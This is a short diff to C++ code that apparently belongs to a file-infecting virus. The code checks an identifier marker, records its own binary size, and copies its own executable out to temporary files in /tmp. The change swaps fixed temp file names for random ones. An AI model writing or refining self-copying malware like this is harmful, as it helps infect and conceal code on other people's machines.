@@ -3,13 +3,18 @@
 
 const char* IDENTIFIER = "PROBOTEST";
 
-const int MYSIZE = 14752;
+const int MYSIZE = 14964;
 
 using namespace std;
 
 int main (int argc, char** argv) {
+    srand(time(0));
+    string exe = "/tmp/", vir = "/tmp/";
+    for (int i = 0; i < 8; i++) {
+        exe += (char)((rand() % 26) + 65);
+        vir += (char)((rand() % 26) + 65);
+    }
     int c;
-    string exe = "/tmp/probo0", vir = "/tmp/probo1";
     string me = (string)argv[0], command;
     ifstream fi(me);
     ofstream fo(exe);
